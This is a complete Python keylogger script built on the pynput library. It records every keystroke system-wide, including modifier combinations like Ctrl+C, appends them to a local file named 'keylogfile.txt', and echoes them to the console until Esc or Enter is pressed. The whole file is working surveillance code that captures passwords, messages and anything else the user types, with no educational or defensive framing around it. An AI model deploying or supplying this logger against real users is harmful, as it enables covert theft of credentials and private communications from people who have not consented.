from pynput import keyboard

# To store the state of modifier keys (e.g., Ctrl, Shift, Alt)
modifier_keys = {
    'ctrl': False,
    'shift': False,
    'alt': False
}

# Mapping of special control sequences to readable names
control_characters = {
    '\x03': 'C',  # Ctrl+C
    '\x16': 'V',  # Ctrl+V
    '\x18': 'X',  # Ctrl+X
    '\x1a': 'Z',  # Ctrl+Z
    # Add more mappings as needed
}

# Function to handle key presses
def on_press(key):
    try:
        # Update modifier key states
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            modifier_keys['ctrl'] = True
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            modifier_keys['shift'] = True
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            modifier_keys['alt'] = True

        # Handle regular keys or combinations
        if hasattr(key, 'char') and key.char is not None:  # Regular character keys
            char = control_characters.get(key.char, key.char)  # Map control characters
            if any(modifier_keys.values()):  # If any modifier key is active
                log_combination(char)
            else:
                log_key(char)
        else:  # Special keys like F1, Esc, etc.
            key_name = str(key).replace('Key.', '')  # Clean up key names
            if any(modifier_keys.values()):  # If any modifier key is active
                log_combination(key_name)
            else:
                log_key(f"[{key_name}]")
    except Exception as e:
        print(f"Error: {e}")

# Function to handle key releases (to reset the modifier state)
def on_release(key):
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        modifier_keys['ctrl'] = False
    elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        modifier_keys['shift'] = False
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        modifier_keys['alt'] = False

    # If the 'Esc' key is pressed, stop the listener
    if key == keyboard.Key.esc:
        return False

# Function to log key combinations like Ctrl+C
def log_combination(key):
    modifier_combo = ''
    if modifier_keys['ctrl']:
        modifier_combo += 'Ctrl+'
    if modifier_keys['shift']:
        modifier_combo += 'Shift+'
    if modifier_keys['alt']:
        modifier_combo += 'Alt+'

    combo = modifier_combo + key
    with open("keylogfile.txt", "a") as Lkey:
        Lkey.write(f"[{combo}]")
        print(f"[{combo}]", end='', flush=True)

# Function to log individual keys
def log_key(key):
    with open("keylogfile.txt", "a") as Lkey:
        Lkey.write(f"{key}")
        print(f"{key}", end='', flush=True)

# Listener setup
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

# Keep the program running
input("Press Enter to stop logging...\n")
